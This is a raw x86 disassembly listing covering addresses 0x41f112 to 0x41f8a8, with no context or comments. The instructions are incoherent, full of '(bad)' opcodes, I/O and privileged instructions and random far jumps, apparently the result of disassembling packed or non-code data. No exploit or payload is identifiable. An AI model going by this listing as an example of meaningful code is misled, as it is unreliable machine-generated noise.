  41f112:	jp     0x41f16a
  41f114:	push   es
  41f115:	mov    cl,0xdc
  41f117:	scas   eax,DWORD PTR es:[edi]
  41f118:	out    dx,eax
  41f119:	inc    edi
  41f11a:	out    dx,al
  41f11b:	sub    eax,DWORD PTR [ecx+0x7745bdf8]
  41f121:	jb     0x41f0d6
  41f123:	inc    DWORD PTR [edi+0x23]
  41f126:	out    0x76,al
  41f128:	hlt    
  41f129:	les    esi,FWORD PTR [ebx]
  41f12b:	iret   
  41f12c:	cld    
  41f12d:	sbb    esi,DWORD PTR [edi]
  41f12f:	push   ebx
  41f130:	pop    ss
  41f131:	ret    0x5a9
  41f134:	cmp    bh,BYTE PTR [ebp+0x6f]
  41f137:	jae    0x41f14c
  41f139:	jp     0x41f15b
  41f13b:	adc    eax,DWORD PTR [edi]
  41f13d:	push   ebp
  41f13e:	xchg   edi,eax
  41f13f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f140:	(bad)  
  41f141:	nop
  41f142:	or     eax,0x7c0c9de6
  41f147:	add    cl,cl
  41f149:	or     esp,DWORD PTR [esi+0x6f5ab9d]
  41f14f:	js     0x41f13a
  41f151:	ror    edi,1
  41f153:	adc    DWORD PTR [esi+0x60ad991e],ecx
  41f159:	sub    cl,al
  41f15b:	les    eax,FWORD PTR ds:0xceeea8e3
  41f161:	lock mov al,ds:0x7494aa53
  41f167:	mov    ebp,0xd200780c
  41f16c:	std    
  41f16d:	mov    ecx,0xe4759def
  41f172:	mov    ebp,0xd6122384
  41f177:	fdiv   QWORD PTR [edx+0x35e1f407]
  41f17d:	or     BYTE PTR [edx],cl
  41f17f:	push   ss
  41f180:	fs cmp eax,0xf3342944
  41f186:	sub    ah,cl
  41f188:	mov    edi,0xdf03b2fe
  41f18d:	jge    0x41f11d
  41f18f:	icebp  
  41f190:	arpl   bx,si
  41f192:	dec    ebp
  41f193:	stos   DWORD PTR es:[edi],eax
  41f194:	out    0x7d,al
  41f196:	pop    ebx
  41f197:	and    ah,BYTE PTR [edx+0x3d26e030]
  41f19d:	cmc    
  41f19e:	or     ecx,DWORD PTR [ebx+0x38f20638]
  41f1a4:	mov    ch,0xc2
  41f1a6:	jmp    0xbd1f:0x704d8d9c
  41f1ad:	rol    BYTE PTR [ebx+0x3ab08dff],1
  41f1b3:	push   es
  41f1b4:	imul   BYTE PTR [edi]
  41f1b6:	out    0xf,eax
  41f1b8:	sub    eax,0xcbf34a41
  41f1bd:	sub    DWORD PTR [ebx-0x10d8e470],edi
  41f1c3:	xchg   BYTE PTR [ecx],bl
  41f1c5:	dec    edi
  41f1c6:	inc    ebx
  41f1c7:	adc    eax,0x7135d7a8
  41f1cc:	sub    al,0x86
  41f1ce:	test   eax,0xd7f2073e
  41f1d3:	xchg   edi,eax
  41f1d4:	mov    dh,BYTE PTR [esi+0x39e76fea]
  41f1da:	lods   al,BYTE PTR ds:[esi]
  41f1db:	inc    edx
  41f1dc:	mov    DWORD PTR [esi],ecx
  41f1de:	xchg   esi,eax
  41f1df:	jecxz  0x41f22a
  41f1e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1e2:	lock jnp 0x41f193
  41f1e5:	imul   ecx,DWORD PTR [eax],0xffffffd1
  41f1e8:	aas    
  41f1e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ea:	imul   esi,DWORD PTR [ebx],0x7e2a9c96
  41f1f0:	in     eax,dx
  41f1f1:	test   esp,esi
  41f1f3:	jp     0x41f19d
  41f1f5:	xchg   esi,eax
  41f1f6:	sub    eax,0xf695c310
  41f1fb:	scas   al,BYTE PTR es:[edi]
  41f1fc:	mov    BYTE PTR [edx],ch
  41f1fe:	cmp    ebp,DWORD PTR [ebp+0x39]
  41f201:	stos   DWORD PTR es:[edi],eax
  41f202:	mov    es,ebx
  41f204:	mov    dl,BYTE PTR [esi]
  41f206:	fdivr  QWORD PTR [esi+0x4b]
  41f209:	sub    bl,BYTE PTR [esi]
  41f20b:	loope  0x41f20c
  41f20d:	push   esp
  41f20e:	ins    BYTE PTR es:[edi],dx
  41f20f:	int    0x80
  41f211:	js     0x41f20b
  41f213:	call   0xb837d36f
  41f218:	imul   eax,DWORD PTR [edx],0xffffffde
  41f21b:	scas   al,BYTE PTR es:[edi]
  41f21c:	repnz aad 0x16
  41f21f:	sub    DWORD PTR [ecx-0x5e],ebp
  41f222:	psubsw mm3,QWORD PTR cs:[ecx]
  41f226:	(bad)  
  41f227:	cmp    esp,edx
  41f229:	mov    DWORD PTR [esi+0x19d9267c],esi
  41f22f:	call   0xb287:0x89790577
  41f236:	push   edi
  41f237:	jmp    0xaecd6a55
  41f23c:	fld    TBYTE PTR [edx+0x3bad972f]
  41f242:	rcl    DWORD PTR [ecx],1
  41f244:	aas    
  41f245:	out    dx,eax
  41f246:	or     bh,BYTE PTR [esp+eiz*4]
  41f249:	fmul   st(0),st
  41f24b:	pop    ebx
  41f24c:	(bad)  
  41f24d:	cmp    ah,BYTE PTR [ebx]
  41f24f:	fadd   st,st(5)
  41f251:	adc    DWORD PTR [edi],esi
  41f253:	add    bh,BYTE PTR [esi+0x108bbcf5]
  41f259:	sbb    cl,dh
  41f25b:	mov    dh,BYTE PTR [ebx-0x3b]
  41f25e:	pop    ss
  41f25f:	or     DWORD PTR [edi+0x671ae56],esi
  41f265:	imul   ebx,DWORD PTR [ecx+edi*1-0x50],0xf6c7b18d
  41f26d:	push   ds
  41f26e:	(bad)  
  41f26f:	js     0x41f236
  41f271:	gs (bad) 
  41f274:	pushf  
  41f275:	adc    DWORD PTR [ebx*8-0x1f91149d],ecx
  41f27c:	pop    ss
  41f27d:	mov    ch,BYTE PTR ds:0xcbad6a49
  41f283:	test   BYTE PTR [esi+0x2bba4247],bl
  41f289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f28a:	xlat   BYTE PTR ds:[ebx]
  41f28b:	(bad)  
  41f28c:	in     al,0x39
  41f28e:	retf   0xef3b
  41f291:	sub    BYTE PTR [edi-0x25],al
  41f294:	pop    ebp
  41f295:	dec    eax
  41f296:	rol    DWORD PTR [ecx],cl
  41f298:	out    dx,eax
  41f299:	loopne 0x41f286
  41f29b:	inc    ebx
  41f29c:	fwait
  41f29d:	jne    0x41f226
  41f29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2a0:	mov    dh,0x10
  41f2a2:	push   0x13
  41f2a4:	cmp    eax,0x73cb2bb3
  41f2a9:	mov    dh,0x68
  41f2ab:	in     eax,0xaf
  41f2ad:	jmp    0x1dfb5bd7
  41f2b2:	shl    DWORD PTR [esi+eax*4],1
  41f2b5:	das    
  41f2b6:	mov    eax,ds:0xe5f1c66b
  41f2bb:	sbb    BYTE PTR [ebp-0x236c28f8],ch
  41f2c1:	loope  0x41f253
  41f2c3:	sti    
  41f2c4:	inc    edi
  41f2c5:	stos   DWORD PTR es:[edi],eax
  41f2c6:	jnp    0x41f2fc
  41f2c8:	enter  0xef7,0xbf
  41f2cc:	inc    eax
  41f2cd:	xchg   esi,eax
  41f2ce:	into   
  41f2cf:	jnp    0x41f2bc
  41f2d1:	pop    esi
  41f2d2:	div    BYTE PTR [eax+ebx*8-0x4d]
  41f2d6:	scas   eax,DWORD PTR es:[edi]
  41f2d7:	adc    DWORD PTR [edx+0x4f317f4d],ebx
  41f2dd:	jmp    0xbe41c76f
  41f2e2:	add    eax,0x1c9d1a54
  41f2e7:	sbb    eax,0x16eb0e10
  41f2ec:	sti    
  41f2ed:	fild   WORD PTR [ebp-0xe]
  41f2f0:	mov    dl,0x88
  41f2f2:	pop    ebx
  41f2f3:	sbb    eax,0x12a1136a
  41f2f8:	dec    ebp
  41f2f9:	pop    eax
  41f2fa:	rol    DWORD PTR [edx+0x1],1
  41f2fd:	mov    BYTE PTR [ecx+0x5c],al
  41f300:	(bad)  
  41f301:	fdivr  QWORD PTR [edi+0x5b36523c]
  41f307:	jmp    0x944a:0x257aa99e
  41f30e:	sbb    al,0x3b
  41f310:	ins    DWORD PTR es:[edi],dx
  41f311:	cmp    dh,BYTE PTR [edx+0x7e525494]
  41f317:	add    bh,bh
  41f319:	and    BYTE PTR [ebx-0x3d],0x28
  41f31d:	test   esi,eax
  41f31f:	lds    ecx,FWORD PTR [ebp+edx*1+0x38bd7860]
  41f326:	lock (bad) 
  41f328:	das    
  41f329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f32a:	lea    esi,[ecx]
  41f32c:	test   eax,0xe2dadb70
  41f331:	mov    bl,0xbc
  41f333:	lahf   
  41f334:	jae    0x41f308
  41f336:	(bad)  
  41f337:	sub    ecx,ecx
  41f339:	out    dx,eax
  41f33a:	scas   al,BYTE PTR es:[edi]
  41f33b:	mov    ecx,0x35ab9af9
  41f340:	pop    esi
  41f342:	loope  0x41f38d
  41f344:	cmp    DWORD PTR [ecx-0x35],0x80f86e6d
  41f34b:	fs nop
  41f34d:	jg     0x41f313
  41f34f:	sub    al,0xa5
  41f351:	daa    
  41f352:	popa   
  41f353:	or     edi,edx
  41f355:	mov    ds:0x203b6f15,eax
  41f35a:	pop    ebp
  41f35b:	dec    esp
  41f35c:	(bad)
  41f35f:	fstp   TBYTE PTR [edi]
  41f361:	ror    esi,1
  41f363:	pop    ebp
  41f364:	test   BYTE PTR [esi+0x6709f6fa],al
  41f36a:	scas   al,BYTE PTR es:[edi]
  41f36b:	cmp    BYTE PTR [ecx],al
  41f36d:	inc    edi
  41f36e:	xchg   ebp,eax
  41f36f:	hlt    
  41f370:	mov    edi,0x97cb213c
  41f375:	iret   
  41f376:	inc    esp
  41f377:	xchg   esp,eax
  41f378:	bnd jmp 0xaa8c8797
  41f37e:	inc    edi
  41f37f:	nop
  41f380:	(bad)  
  41f381:	clc    
  41f382:	es in  eax,dx
  41f384:	out    0x91,al
  41f386:	lock push esp
  41f388:	push   ebx
  41f389:	xchg   ebx,eax
  41f38a:	and    dh,BYTE PTR [edi+edi*8+0x703afc7b]
  41f391:	or     eax,0xc12cac73
  41f396:	fimul  DWORD PTR [edi+0x1b]
  41f399:	mov    al,dh
  41f39b:	sub    cl,cl
  41f39d:	jae    0x41f3ed
  41f39f:	pusha  
  41f3a0:	shl    DWORD PTR [ebx+0x70],1
  41f3a3:	mov    al,ds:0x41bd3184
  41f3a8:	sbb    cl,BYTE PTR [edi+0x492a0a6b]
  41f3ae:	push   ebp
  41f3af:	and    eax,0xa0d9aabf
  41f3b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3b5:	cmp    BYTE PTR [ebp-0x64211a04],ch
  41f3bb:	jns    0x41f409
  41f3bd:	push   0x2f
  41f3bf:	daa    
  41f3c0:	push   ecx
  41f3c1:	and    BYTE PTR [edi+0x23],dl
  41f3c4:	shl    DWORD PTR [edi],0x11
  41f3c7:	iret   
  41f3c8:	mov    ebp,0x650dd854
  41f3cd:	cmp    eax,0x7f0c69b3
  41f3d3:	mov    edx,0x27521b80
  41f3d8:	cs push esp
  41f3da:	mov    ebx,0x255b4f22
  41f3df:	mov    eax,ds:0xc731e744
  41f3e4:	xchg   esp,eax
  41f3e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3e6:	pusha  
  41f3e7:	lods   eax,DWORD PTR ds:[esi]
  41f3e8:	sub    edi,ebp
  41f3ea:	pusha  
  41f3eb:	repz iret 
  41f3ed:	jbe    0x41f3d3
  41f3ef:	stos   DWORD PTR es:[edi],eax
  41f3f0:	mov    ds:0xfc22041f,eax
  41f3f5:	adc    ecx,esp
  41f3f7:	sub    ebx,DWORD PTR [edi-0x66]
  41f3fa:	cmp    DWORD PTR [edx],edi
  41f3fc:	lds    ecx,FWORD PTR [edi+0x8]
  41f3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f400:	push   es
  41f401:	stos   BYTE PTR es:[edi],al
  41f402:	lds    esp,FWORD PTR [edx]
  41f404:	jns    0x41f3d1
  41f406:	pop    ebp
  41f407:	dec    ebp
  41f408:	addr16 mov ebp,0x21c94fd4
  41f40e:	imul   edx,DWORD PTR [ebx],0xaefcb70d
  41f414:	lahf   
  41f415:	jbe    0x41f42b
  41f417:	xchg   edi,eax
  41f418:	push   ecx
  41f419:	sub    bl,BYTE PTR [edi]
  41f41b:	inc    edx
  41f41c:	popa   
  41f41d:	jae    0x41f434
  41f41f:	cmp    DWORD PTR [eax+0x6f],edi
  41f422:	jg     0x41f42e
  41f424:	js     0x41f3d9
  41f426:	std    
  41f427:	or     BYTE PTR [edi],dh
  41f429:	cmp    eax,0x46102ced
  41f42e:	or     dh,bl
  41f430:	inc    edi
  41f431:	leave  
  41f432:	data16 mov dl,0xd4
  41f435:	push   esi
  41f436:	enter  0xbb94,0x3f
  41f43a:	or     BYTE PTR [edx+edx*4-0x38a68e34],0xce
  41f442:	adc    BYTE PTR [edi-0x2352bce0],0xa2
  41f449:	je     0x41f3d5
  41f44b:	stc    
  41f44c:	jb     0x41f435
  41f44e:	jmp    0xa4d7:0x75541ef1
  41f455:	pop    ds
  41f456:	rcl    esi,1
  41f458:	pop    esp
  41f459:	pop    esi
  41f45a:	push   edi
  41f45b:	aam    0xd0
  41f45d:	xor    DWORD PTR [eax-0x568dd37d],ebp
  41f463:	shr    DWORD PTR [ecx-0x4e],cl
  41f466:	mov    al,ds:0xd22cdaf
  41f46b:	outs   dx,DWORD PTR ds:[esi]
  41f46c:	jmp    0x41f3f6
  41f46e:	xchg   esi,eax
  41f46f:	mov    edx,0x969170b1
  41f474:	jmp    0x41f4a7
  41f476:	push   esp
  41f477:	sub    eax,0xe96da5cc
  41f47c:	xchg   edi,eax
  41f47d:	dec    edi
  41f47e:	mov    al,ds:0x726e197a
  41f483:	sbb    eax,0xf60f6681
  41f488:	adc    BYTE PTR [ebx],dh
  41f48a:	outs   dx,DWORD PTR ds:[esi]
  41f48b:	(bad)  
  41f48c:	int3   
  41f48d:	(bad)
  41f491:	mov    edi,0x175c7759
  41f496:	ret    
  41f497:	ins    DWORD PTR es:[edi],dx
  41f498:	inc    edi
  41f499:	out    dx,al
  41f49a:	adc    eax,DWORD PTR [edi]
  41f49c:	pop    esp
  41f49d:	and    DWORD PTR [esi+0x73],edx
  41f4a0:	xchg   esi,eax
  41f4a1:	jno    0x41f487
  41f4a3:	xor    DWORD PTR [edx],edx
  41f4a5:	jmp    0x7345:0xa6c4da36
  41f4ac:	jg     0x41f4f1
  41f4ae:	pushw  ss
  41f4b0:	aas    
  41f4b1:	mov    BYTE PTR ds:[eax],dh
  41f4b4:	rcr    ebx,cl
  41f4b6:	fadd   DWORD PTR [edx]
  41f4b8:	push   cs
  41f4b9:	aaa    
  41f4ba:	(bad)
  41f4bd:	and    ah,ch
  41f4bf:	and    al,0x74
  41f4c1:	mov    cs,WORD PTR [si-0x6a4d]
  41f4c6:	xor    al,BYTE PTR [ecx]
  41f4c8:	push   es
  41f4c9:	stos   DWORD PTR es:[edi],eax
  41f4ca:	repnz add eax,0x84435649
  41f4d0:	pop    edx
  41f4d1:	add    eax,0xc6689c9b
  41f4d6:	mov    bh,0xba
  41f4d8:	loope  0x41f530
  41f4da:	add    eax,DWORD PTR [ebp-0x2e]
  41f4dd:	in     al,dx
  41f4de:	(bad)  
  41f4df:	(bad)  
  41f4e0:	icebp  
  41f4e1:	cmp    ch,BYTE PTR [edx]
  41f4e3:	mov    dl,0x4e
  41f4e5:	cmc    
  41f4e6:	ins    BYTE PTR es:[edi],dx
  41f4e7:	mov    ds:0x476eff87,al
  41f4ec:	adc    DWORD PTR [eax+0x41],ebp
  41f4ef:	pop    eax
  41f4f0:	xchg   edx,eax
  41f4f1:	and    eax,0x83fe2571
  41f4f6:	call   0xf201d9b
  41f4fb:	inc    esi
  41f4fc:	loop   0x41f56e
  41f4fe:	jl     0x41f530
  41f500:	cmp    DWORD PTR [ecx+0x7c],0x6d
  41f504:	popf   
  41f505:	xlat   BYTE PTR ds:[ebx]
  41f506:	in     al,0x91
  41f508:	sbb    ebx,ebp
  41f50a:	scas   eax,DWORD PTR es:[edi]
  41f50b:	imul   ebx,DWORD PTR [edx+0x3f],0x23
  41f50f:	and    DWORD PTR [ebx+ebp*8+0x73a1c6ea],esp
  41f516:	rcr    DWORD PTR [edx+ebp*2],1
  41f519:	mov    esp,0x60205c25
  41f51e:	and    dl,BYTE PTR [ecx]
  41f520:	imul   edx,eax,0xffffffdf
  41f523:	sbb    BYTE PTR [edx-0x52],0xe4
  41f527:	push   edi
  41f528:	shl    eax,0xe9
  41f52b:	sub    BYTE PTR [edx+0x723fe340],0xf
  41f532:	xchg   DWORD PTR [eax],ecx
  41f534:	add    BYTE PTR [eax],al
  41f536:	add    BYTE PTR [ebx-0x341627ab],cl
  41f53c:	xor    al,BYTE PTR [eax]
  41f53e:	add    BYTE PTR [ebx+0x7d8bd055],cl
  41f544:	cld    
  41f545:	xor    edx,eax
  41f547:	xor    edi,eax
  41f549:	add    edi,ecx
  41f54b:	jmp    0x41fa5d
  41f550:	cmp    al,0xd0
  41f552:	les    edi,FWORD PTR ds:0xd9c9d1d4
  41f558:	jmp    0xee7cea0
  41f55d:	and    DWORD PTR [ecx-0x3b],0x3c
  41f561:	dec    eax
  41f562:	jg     0x41f5dc
  41f564:	jae    0x41f5e2
  41f566:	js     0x41f5e0
  41f568:	dec    edx
  41f569:	cli    
  41f56a:	sbb    edx,0x5ada2055
  41f570:	sbb    al,0xc0
  41f572:	adc    eax,0x405b93ab
  41f577:	pusha  
  41f578:	(bad)
  41f57b:	mov    BYTE PTR es:[ebx-0x3],0x67
  41f580:	cmp    DWORD PTR [ebp+0x1e1dc25a],edx
  41f586:	aam    0x5
  41f588:	mov    fs,WORD PTR [edx]
  41f58a:	sub    bh,dh
  41f58c:	mov    eax,ds:0xe187ba59
  41f591:	sub    DWORD PTR [eax+0xdd167b4],esp
  41f597:	(bad)  
  41f598:	scas   al,BYTE PTR es:[edi]
  41f599:	out    0x5,eax
  41f59b:	ret    0x79b1
  41f59e:	retf   
  41f59f:	sbb    al,0xee
  41f5a1:	es xchg esp,eax
  41f5a3:	call   DWORD PTR [ebx+0x13]
  41f5a6:	jle    0x41f61b
  41f5a8:	mov    BYTE PTR [eax+0x4ec4a712],bh
  41f5ae:	or     cl,BYTE PTR [eax+0x59]
  41f5b1:	iret   
  41f5b2:	mov    ch,BYTE PTR [esi+esi*1]
  41f5b5:	pop    ecx
  41f5b6:	dec    ebx
  41f5b7:	js     0x41f631
  41f5b9:	jae    0x41f59c
  41f5bb:	sbb    al,0x8c
  41f5bd:	jno    0x41f5a7
  41f5bf:	dec    ebx
  41f5c0:	pop    ss
  41f5c1:	ins    BYTE PTR es:[edi],dx
  41f5c2:	jb     0x41f604
  41f5c4:	add    dh,bl
  41f5c6:	inc    ecx
  41f5c7:	sbb    eax,0x7c5fb05a
  41f5cc:	jnp    0x41f55b
  41f5ce:	(bad)  [esi-0xf59988d]
  41f5d4:	jge    0x41f604
  41f5d6:	push   0xffffffe8
  41f5d8:	sbb    ah,cl
  41f5da:	sbb    edi,0x5da304a2
  41f5e0:	in     eax,0x7c
  41f5e2:	mov    edx,0x16a6428f
  41f5e7:	lods   eax,DWORD PTR ds:[esi]
  41f5e8:	ins    DWORD PTR es:[edi],dx
  41f5e9:	jg     0x41f602
  41f5eb:	sbb    BYTE PTR [ebp+0x3f],0xac
  41f5ef:	cmp    al,0xf0
  41f5f1:	xchg   edi,eax
  41f5f2:	mov    ebp,DWORD PTR [esi]
  41f5f4:	inc    esp
  41f5f5:	rcl    BYTE PTR [ebp-0x57de6cf8],0xdd
  41f5fc:	add    esp,DWORD PTR [esi+0x6c]
  41f5ff:	imul   eax,DWORD PTR ds:0xe30abae8,0x18b4718f
  41f609:	imul   esi,DWORD PTR [edi+0x63d70d7e],0xf50dff74
  41f613:	mov    dh,0xfd
  41f615:	icebp  
  41f616:	mov    ds:0x7c7c1c5,al
  41f61b:	inc    edi
  41f61c:	jb     0x41f649
  41f61e:	aam    0x99
  41f620:	ins    DWORD PTR es:[edi],dx
  41f621:	push   edi
  41f622:	sub    eax,0xd1f13352
  41f627:	mov    al,ds:0x2cf34319
  41f62c:	outs   dx,BYTE PTR ds:[esi]
  41f62d:	xor    eax,0xe4f3d7d7
  41f632:	mov    bh,0x66
  41f634:	mov    ecx,0xca5c7ac4
  41f639:	jmp    0x3236:0x60699ca9
  41f640:	ret    
  41f641:	jbe    0x41f5d4
  41f643:	sub    bh,BYTE PTR [edx-0x6c9586e]
  41f649:	sub    esp,ecx
  41f64b:	jb     0x41f68d
  41f64d:	xchg   esp,eax
  41f64e:	mov    al,0x15
  41f650:	xlat   BYTE PTR ds:[ebx]
  41f651:	push   cs
  41f652:	mov    eax,0xf29baa4e
  41f657:	fiadd  WORD PTR [eax+0x28]
  41f65a:	hlt    
  41f65b:	mov    al,0xe5
  41f65d:	cmp    DWORD PTR ds:0x5dd2883c,ebp
  41f663:	sti    
  41f664:	sub    eax,0x32f062ea
  41f669:	fmul   DWORD PTR [edx+ecx*4]
  41f66c:	pop    ebx
  41f66d:	test   al,bl
  41f66f:	jb     0x41f5fb
  41f671:	mov    ds:0xae245d57,al
  41f676:	cmc    
  41f677:	jge    0x41f6ea
  41f679:	sub    al,0xbe
  41f67b:	loop   0x41f6e3
  41f67d:	mov    bh,BYTE PTR ds:0x2df5f5c2
  41f683:	fist   WORD PTR [edx-0x46d74ba5]
  41f689:	push   cs
  41f68a:	sbb    eax,0xeda0d976
  41f68f:	data16 and BYTE PTR [esi+0x6649a4e2],bh
  41f696:	jmp    0x41f61d
  41f698:	aam    0x6a
  41f69a:	hlt    
  41f69b:	push   esp
  41f69c:	sub    DWORD PTR [ecx],edx
  41f69e:	push   esi
  41f69f:	cwde   
  41f6a0:	pop    ecx
  41f6a1:	rol    BYTE PTR [ebp+0x2e],cl
  41f6a4:	jnp    0x41f67d
  41f6a6:	int3   
  41f6a7:	imul   ebp,esp,0x69
  41f6aa:	xchg   ebp,eax
  41f6ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6ac:	(bad)  
  41f6ae:	dec    edx
  41f6af:	fadd   DWORD PTR [edx+edi*1]
  41f6b2:	mov    esi,es
  41f6b4:	jne    0x41f67c
  41f6b6:	or     eax,DWORD PTR fs:[edx]
  41f6b9:	dec    edx
  41f6ba:	ja     0x41f71a
  41f6bc:	cwde   
  41f6bd:	not    DWORD PTR [ebp+0x337c9f52]
  41f6c3:	ins    BYTE PTR es:[edi],dx
  41f6c4:	rcl    DWORD PTR [ebx-0x52ac24ef],0xab
  41f6cb:	ds lock call 0xbfab9c3
  41f6d2:	cli    
  41f6d3:	cmp    WORD PTR [edi-0x372804a3],di
  41f6da:	ror    DWORD PTR [edi-0x12367982],0x38
  41f6e1:	nop
  41f6e2:	mov    esp,0x67f94418
  41f6e7:	(bad)  
  41f6e8:	aad    0x5a
  41f6ea:	dec    edi
  41f6eb:	das    
  41f6ec:	cmc    
  41f6ed:	bound  eax,QWORD PTR [ecx-0x6dd2cd]
  41f6f3:	add    esi,DWORD PTR [esi+0x2f]
  41f6f6:	repz mov eax,ds:0x1457131f
  41f6fc:	mov    DWORD PTR [ebp*8+0x54e23808],esp
  41f703:	sar    ch,0x7b
  41f706:	cmc    
  41f707:	mul    BYTE PTR [ebx+0xa9c6a92]
  41f70d:	push   ecx
  41f70e:	mov    bl,0x3c
  41f710:	sbb    DWORD PTR ds:[ebx],edx
  41f713:	pop    eax
  41f714:	mov    ebx,0x3b168202
  41f719:	lahf   
  41f71a:	push   ebp
  41f71b:	and    esp,esp
  41f71d:	sbb    al,BYTE PTR [esi-0x61c97b7f]
  41f723:	mov    dl,0xca
  41f725:	imul   edi,DWORD PTR [eax-0x53],0x7d
  41f729:	cdq    
  41f72a:	sahf   
  41f72b:	fwait
  41f72c:	pop    edx
  41f72d:	pop    ebx
  41f72e:	retf   
  41f72f:	retf   0x6665
  41f732:	aad    0x42
  41f734:	dec    ebp
  41f735:	jmp    0x2677:0x55fc3c7d
  41f73c:	xor    cl,BYTE PTR [edi]
  41f73e:	fsub   QWORD PTR [edi-0x588b4d30]
  41f744:	mov    dl,0x9
  41f746:	inc    ecx
  41f747:	popf   
  41f748:	das    
  41f749:	sub    bh,BYTE PTR [ecx]
  41f74b:	jno    0x41f7ab
  41f74d:	add    esi,DWORD PTR [edi+0x63]
  41f750:	inc    eax
  41f751:	ret    0xda7a
  41f754:	sbb    DWORD PTR ds:0x20620b47,edi
  41f75a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f75c:	cld    
  41f75d:	imul   eax,DWORD PTR [edi+0x4eecb5a7],0xffffffb2
  41f764:	dec    ebx
  41f765:	mov    eax,ds:0x4b549ee5
  41f76a:	enter  0x25e9,0x7e
  41f76e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f76f:	adc    DWORD PTR [ebp+0x155e581d],ecx
  41f775:	stos   BYTE PTR es:[edi],al
  41f776:	adc    BYTE PTR [edx],0x43
  41f779:	cmp    al,0xba
  41f77b:	pop    es
  41f77c:	mov    WORD PTR [ebx+0x3d],ss
  41f77f:	repz and esp,DWORD PTR [ebp+0x44a05b1d]
  41f786:	imul   esi,DWORD PTR [ebp+ebp*4+0x1d],0x4b
  41f78b:	ja     0x41f77d
  41f78d:	mov    edx,0x9d3319fa
  41f792:	sti    
  41f793:	xchg   edi,ebx
  41f795:	dec    esi
  41f796:	bound  ebx,QWORD PTR [ebx+0x3dd871da]
  41f79c:	sub    cl,BYTE PTR [ebx+0x3e]
  41f79f:	sub    edi,esp
  41f7a1:	ficomp DWORD PTR [edi]
  41f7a3:	dec    edi
  41f7a4:	ja     0x41f7db
  41f7a6:	mov    esp,0xcbd826c0
  41f7ab:	or     ch,BYTE PTR [edx+ecx*2-0x5c7754ff]
  41f7b2:	ins    BYTE PTR es:[edi],dx
  41f7b3:	shr    DWORD PTR cs:[ebx+ebp*4],0x46
  41f7b8:	je     0x41f7e8
  41f7ba:	jmp    0x41f752
  41f7bc:	inc    esp
  41f7bd:	(bad)  
  41f7be:	retf   
  41f7bf:	mov    ebx,0xd8e54a67
  41f7c4:	addr16 cwde 
  41f7c6:	out    0x98,eax
  41f7c8:	shr    DWORD PTR [ebp*8-0xf2e912a],0x9f
  41f7d0:	jmp    FWORD PTR [eax+0xf]
  41f7d3:	mov    BYTE PTR [edx],bl
  41f7d5:	fmul   QWORD PTR [ebp-0x62]
  41f7d8:	lods   al,BYTE PTR ds:[esi]
  41f7d9:	mov    ds:0x51deb645,al
  41f7de:	cmp    ecx,edx
  41f7e0:	js     0x41f7c1
  41f7e2:	sbb    ch,BYTE PTR [ecx+ebx*4+0x6901d811]
  41f7e9:	mov    bl,0xab
  41f7eb:	push   0xffffffc8
  41f7ed:	inc    eax
  41f7ee:	jne    0x41f77c
  41f7f0:	dec    ebx
  41f7f1:	xchg   ebp,eax
  41f7f2:	adc    eax,0x611fe7b9
  41f7f7:	jle    0x41f828
  41f7f9:	ins    DWORD PTR es:[edi],dx
  41f7fa:	push   es
  41f7fb:	push   ecx
  41f7fc:	ss pop ss
  41f7fe:	mul    BYTE PTR [edi+0x6e15b38b]
  41f804:	pop    ss
  41f805:	cmp    al,0x9
  41f807:	push   ebx
  41f808:	add    DWORD PTR [edx+0x6ef64ada],edi
  41f80e:	mov    bl,0x3a
  41f810:	pop    es
  41f811:	add    eax,0xf4d50622
  41f816:	push   0x6bfcb533
  41f81b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f81c:	test   eax,0x6191eac7
  41f821:	xor    bl,BYTE PTR [edx+0x4f55c259]
  41f827:	fidiv  WORD PTR [esi+ecx*4+0x4c]
  41f82b:	shl    ebp,cl
  41f82d:	sub    BYTE PTR [edi],dl
  41f82f:	pop    ss
  41f830:	dec    ebp
  41f831:	pop    edi
  41f832:	adc    BYTE PTR [eax],al
  41f834:	or     esi,esp
  41f836:	mov    ebx,0x9cf2841b
  41f83b:	pop    ebp
  41f83c:	ss sbb al,cl
  41f83f:	(bad)  
  41f840:	stc    
  41f841:	adc    al,0xab
  41f843:	mov    ebp,0x87175ea2
  41f848:	fsub   DWORD PTR [edi-0x54bdc1e1]
  41f84e:	iret   
  41f84f:	sbb    DWORD PTR [edi],ebp
  41f851:	outs   dx,DWORD PTR es:[esi]
  41f853:	xor    al,0xa8
  41f855:	in     al,dx
  41f856:	push   ds
  41f857:	xor    al,0x95
  41f859:	xor    eax,0x576624c6
  41f85e:	dec    eax
  41f85f:	jecxz  0x41f8af
  41f861:	push   es
  41f862:	outs   dx,BYTE PTR ds:[esi]
  41f863:	pop    edi
  41f864:	sbb    BYTE PTR [edx+0xb2ad29a],dl
  41f86a:	push   edx
  41f86b:	js     0x41f80b
  41f86d:	inc    edx
  41f86e:	enter  0x60b3,0xf
  41f872:	cli    
  41f873:	inc    edi
  41f874:	shr    DWORD PTR [esi-0x4f],0x8f
  41f878:	dec    esp
  41f879:	mov    esp,0xae0a840a
  41f87e:	fidivr WORD PTR [esi+0x41e40c33]
  41f884:	pop    ecx
  41f885:	hlt    
  41f886:	mov    ebx,0x582e9aba
  41f88b:	pop    edx
  41f88c:	sbb    DWORD PTR [eax],edi
  41f88e:	sbb    DWORD PTR [ebx-0x25],ecx
  41f891:	rol    DWORD PTR [edx+ebx*8],cl
  41f894:	lods   al,BYTE PTR ds:[esi]
  41f895:	mov    edx,0xead984d5
  41f89a:	into   
  41f89b:	xchg   esp,eax
  41f89c:	ds pop ecx
  41f89e:	lea    edi,[edi]
  41f8a0:	and    DWORD PTR [ebx+0x104f14ed],esi
  41f8a6:	jmp    0x41f863
  41f8a8:	lahf   
